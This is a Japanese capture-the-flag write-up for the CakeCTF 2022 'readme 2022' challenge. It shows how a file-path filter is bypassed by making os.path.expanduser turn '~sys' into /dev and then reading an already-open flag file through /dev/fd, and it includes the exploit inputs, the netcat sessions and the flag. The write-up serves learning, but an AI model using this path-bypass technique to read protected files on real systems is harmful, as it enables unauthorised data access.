# readme 2022:misc:135pts
`nc misc.2022.cakectf.com 12022`  

[readme2022_80ade97026adcb7e3e8f6203ad1eab06.tar.gz](readme2022_80ade97026adcb7e3e8f6203ad1eab06.tar.gz)  

# Solution
どこかで見たような問題名だ。  
ひとまずソースを見ると以下のようであった。  
```python
import os

try:
    f = open("/flag.txt", "r")
except:
    print("[-] Flag not found. If this message shows up")
    print("    on the remote server, please report to amdin.")

if __name__ == '__main__':
    filepath = input("filepath: ")
    if filepath.startswith("/"):
        exit("[-] Filepath must not start with '/'")
    elif '..' in filepath:
        exit("[-] Filepath must not contain '..'")

    filepath = os.path.expanduser(filepath)
    try:
        print(open(filepath, "r").read())
    except:
        exit("[-] Could not open file")
```
フラグは同梱されていたDockerfileから`/flag.txt`にあるようだ。  
スクリプトは入力のパスにあるファイルを読み取って表示するだけだが、`..`と`/`での開始が禁止されている。  
明らかに`os.path.expanduser(filepath)`が怪しいので、[ドキュメント](https://docs.python.org/3/library/os.path.html#os.path.expanduser)を見てみる。  
どうやら`~user`がそのユーザのホームディレクトリに置換されるらしい。  
例えば`~ctf`ならば`/home/ctf`となる。  
ここで`/etc/passwd`などを見てやり、`/`に近いホームディレクトリを持つユーザを調査する。  
```bash
ctf@0fb006453c11:/app$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
~~~
```
すると`sys`ユーザのホームが`/dev`であることがわかる。  
`~sys`が`/dev`になるので、この直下をシンボリックリンクなどを期待して漁る。  
```bash
ctf@0fb006453c11:/app$ ls -al /dev
total 4
drwxr-xr-x 5 root root    360 Sep  3 17:27 .
drwxr-xr-x 1 root root   4096 Sep  3 05:27 ..
crw--w---- 1 ctf  tty  136, 0 Sep  3 17:27 console
lrwxrwxrwx 1 root root     11 Sep  3 17:27 core -> /proc/kcore
lrwxrwxrwx 1 root root     13 Sep  3 17:27 fd -> /proc/self/fd
crw-rw-rw- 1 root root   1, 7 Sep  3 17:27 full
drwxrwxrwt 2 root root     40 Sep  3 17:27 mqueue
crw-rw-rw- 1 root root   1, 3 Sep  3 17:27 null
lrwxrwxrwx 1 root root      8 Sep  3 17:27 ptmx -> pts/ptmx
drwxr-xr-x 2 root root      0 Sep  3 17:27 pts
crw-rw-rw- 1 root root   1, 8 Sep  3 17:27 random
drwxrwxrwt 2 root root     40 Sep  3 17:27 shm
lrwxrwxrwx 1 root root     15 Sep  3 17:27 stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root     15 Sep  3 17:27 stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root     15 Sep  3 17:27 stdout -> /proc/self/fd/1
crw-rw-rw- 1 root root   5, 0 Sep  3 17:27 tty
crw-rw-rw- 1 root root   1, 9 Sep  3 17:27 urandom
crw-rw-rw- 1 root root   1, 5 Sep  3 17:27 zero
```
`/dev/fd`が`/proc/self/fd`へのシンボリックリンクとなっている。  
問題のスクリプトは最初にopenしているので、何番かのfdが掴んでいるだろうと予測できる。  
あとは3以降を適当に試せばよい。  
```bash
$ nc misc.2022.cakectf.com 12022
filepath: ~sys/fd/3
[-] Could not open file

$ nc misc.2022.cakectf.com 12022
filepath: ~sys/fd/4
[-] Could not open file

$ nc misc.2022.cakectf.com 12022
filepath: ~sys/fd/5

^C
$ nc misc.2022.cakectf.com 12022
filepath: ~sys/fd/6
CakeCTF{~USER_r3f3rs_2_h0m3_d1r3ct0ry_0f_USER}


```
flagが得られた。  

## CakeCTF{~USER_r3f3rs_2_h0m3_d1r3ct0ry_0f_USER}